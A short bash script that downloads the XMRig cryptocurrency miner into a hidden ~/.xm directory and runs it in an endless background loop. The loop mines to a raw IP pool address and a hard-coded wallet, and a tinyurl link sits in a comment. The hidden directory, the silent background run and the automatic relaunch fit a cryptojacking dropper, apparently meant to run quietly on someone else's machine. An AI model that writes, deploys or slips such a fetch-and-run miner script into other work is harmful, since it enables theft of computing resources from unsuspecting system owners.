#!/bin/bash
#https://tinyurl.com/yeykufsv
rm -rf .xm
mkdir .xm
cd .xm
wget -O xmrig.tar.gz  https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-x64.tar.gz
tar -xzf xmrig.tar.gz
cd xmrig-6.20.0
while [ true ]
do
  ~/.xm/xmrig-6.20.0/xmrig -o 44.196.193.227:10128 -p hx --background -u 46xgJzzbpiEXtzzxFFokaq32QAx1UCekBEMjDcGD6uBVHMXaqhGqmrnUCASr8Fa7KRF5n35Rkrt3TedjB6yqF1qUMMVTsCr
done
